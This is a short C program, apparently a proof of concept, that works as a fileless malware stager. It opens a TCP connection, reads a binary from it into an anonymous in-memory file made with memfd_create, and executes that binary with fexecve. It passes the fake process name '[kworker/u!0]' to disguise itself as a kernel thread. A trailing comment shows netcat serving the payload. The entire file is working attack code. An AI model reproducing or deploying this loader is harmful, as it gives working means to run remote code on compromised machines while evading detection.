#include <stdio.h>
#include <stdlib.h>

#include <sys/syscall.h>

#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

// memfd_open Syscall not defined
// Got index from http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
#define __NR_memfd_create 319
#define MFD_CLOEXEC 1

static inline int memfd_create(const char *name, unsigned int flags) {
    return syscall(__NR_memfd_create, name, flags);
}

extern char        **environ;

int
main (int argc, char **argv)
{
  int                fd, s;
  unsigned long      addr = 0x0100007f11110002;
  char               *args[2]= {"[kworker/u!0]", NULL};
  char               buf[1024];

  // Connect
  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) exit (1);
  if (connect (s, (struct sockaddr*)&addr, 16) < 0) exit (1);
  if ((fd = memfd_create("a", MFD_CLOEXEC)) < 0) exit (1);

  while (1)
    {
      if ((read (s, buf, 1024) ) <= 0) break;
      write (fd, buf, 1024);
    }
  close (s);
  
  if (fexecve (fd, args, environ) < 0) exit (1);

  return 0;
    
}
// cat /usr/bin/xterm | nc -l $((0x1111))
